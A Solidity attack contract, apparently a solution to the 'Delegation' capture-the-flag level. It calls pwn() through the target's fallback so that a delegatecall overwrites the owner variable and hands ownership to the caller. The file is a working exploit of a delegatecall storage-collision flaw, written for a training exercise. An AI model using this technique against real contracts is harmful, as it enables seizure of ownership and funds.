// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Simply call `pwn` since unknown func sig will trigger `fallback` in Delegation
        // and delegatecall to Delegate with `pwn()` ad the called function
        // Since bot hcontract share the same storage structure, `owner` will be overwritten with msg.sender
        contractAddress.call(abi.encodeWithSignature("pwn()"));
    }
}
